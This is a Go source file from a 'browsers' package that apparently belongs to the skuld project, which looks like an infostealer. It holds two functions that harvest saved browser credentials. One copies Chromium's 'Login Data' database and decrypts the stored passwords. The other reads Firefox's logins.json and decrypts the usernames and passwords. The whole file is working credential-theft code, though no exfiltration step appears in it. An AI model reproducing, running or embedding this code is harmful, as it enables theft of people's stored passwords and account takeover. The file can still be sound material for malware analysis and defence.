package browsers

import (
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"os"

	"path/filepath"

	_ "modernc.org/sqlite"

	"github.com/hackirby/skuld/utils/fileutil"
)

func (c *Chromium) GetLogins(path string) (logins []Login, err error) {
	tempPath := filepath.Join(os.TempDir(), "login_db")
	err = fileutil.CopyFile(filepath.Join(path, "Login Data"), tempPath)
	if err != nil {
		return nil, err
	}

	db, err := sql.Open("sqlite", tempPath)
	if err != nil {
		return nil, err
	}

	defer os.Remove(tempPath)
	defer db.Close()

	rows, err := db.Query("SELECT action_url, username_value, password_value, date_created FROM logins")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	for rows.Next() {
		var (
			url, username string
			pwd, password []byte
			create        int64
		)
		if err := rows.Scan(&url, &username, &pwd, &create); err != nil {
			continue
		}
		if url == "" || username == "" || pwd == nil {
			continue
		}

		login := Login{
			Username: username,
			LoginURL: url,
		}

		password, err = c.Decrypt(pwd)
		if err != nil {
			continue
		}

		login.Password = string(password)
		logins = append(logins, login)
	}

	return logins, nil
}

func (g *Gecko) GetLogins(path string) (logins []Login, err error) {
	s, err := os.ReadFile(path + "\\logins.json")
	if err != nil {
		return nil, err
	}

	var data struct {
		NextId int `json:"nextId"`
		Logins []struct {
			Hostname          string `json:"hostname"`
			EncryptedUsername string `json:"encryptedUsername"`
			EncryptedPassword string `json:"encryptedPassword"`
		}
	}
	err = json.Unmarshal(s, &data)
	if err != nil {
		return nil, err
	}

	for _, v := range data.Logins {
		decodedUser, err := base64.StdEncoding.DecodeString(v.EncryptedUsername)
		if err != nil {
			return nil, err
		}
		decodedPass, err := base64.StdEncoding.DecodeString(v.EncryptedPassword)
		if err != nil {
			return nil, err
		}
		decryptedUser, err := g.Decrypt(decodedUser)
		if err != nil {
			return nil, err
		}
		decryptedPass, err := g.Decrypt(decodedPass)
		if err != nil {
			return nil, err
		}

		logins = append(logins, Login{
			Username: string(decryptedUser),
			Password: string(decryptedPass),
			LoginURL: v.Hostname,
		})
	}

	return logins, nil
}
